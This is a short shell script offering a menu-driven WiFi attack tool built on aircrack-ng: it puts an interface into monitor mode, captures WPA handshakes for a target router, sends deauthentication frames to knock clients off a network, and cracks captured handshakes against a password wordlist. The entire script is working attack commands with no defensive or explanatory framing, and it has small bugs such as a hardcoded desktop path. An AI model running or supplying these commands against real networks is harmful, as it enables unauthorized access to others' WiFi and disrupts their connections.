#!/bin/sh
#By Duncan Andrews
Banner () {
	clear
        echo "Heck "
	echo "---------------"

}

Wifi  () {
	#Sets up monitor mode for an interface
	Banner
	sudo airmon-ng start wlan0
	echo "Setting up monitor mode"
	sleep 5
	Banner
	echo"THese are of the routers in your area, press CTRL + C when you've found the one you need"
	sudo airodump-ng -w wifiNetworks --output-format txt wlan0mon
	#sudo airodump-ng wlan0mon

}

Handshake () {
	Banner
	INTERFACE="wlan0mon"
        echo " Type in the BSSID that you want to use(this should be to the left of the router name) ie. 84:1b:5E:E4:D6:K9: "
        read BSSID
        echo "now type in the channel: "
        read CHANNEL
        clear
        echo "Listening to handshakes between router and devices"
        sudo airodump-ng -c $CHANNEL --bssid $BSSID wlan0mon
	sleep 5
	Home


}


DeAuth () {
	#This performs a deauth attack on target computers
	Banner
	echo "INterface ie. wlan0mon0"
	read INTERFACE
	echo "Router id ie. E4:K6:N4:E4: "
	read ROUTER
	echo "CLient or station id: "
	read CLIENT
	sudo aireplay-ng -0 10 -a $ROUTER -c $CLIENT $INTERFACE
	Home

}

Crack () {
	Banner
	echo "Make sure you have a txt file of passwords called passwords.txt in this directory"
	echo "Enter name of .cap file ie. '0986.cp' :"
	read NAME
	sudo aircrack-ng /tao/Desktop/$NAME -w passwords.txt
}

Home () {
	Banner
	echo "1. Set to monitor mode and view current networks"
	echo "2. Capture Handshakes"
	echo "3. Deauth Attack"
	echo "4. Crack Captured HAndshakes"
	read CHOICE
	if [ $CHOICE = 1 ]
	then Wifi
	fi
	if [ $CHOICE = 3 ]
	then DeAuth
	fi
	if [ $CHOICE = 2 ]
        then Handshake
        fi
	if [ $CHOICE = 4 ]
        then Crack
        fi

}

Home


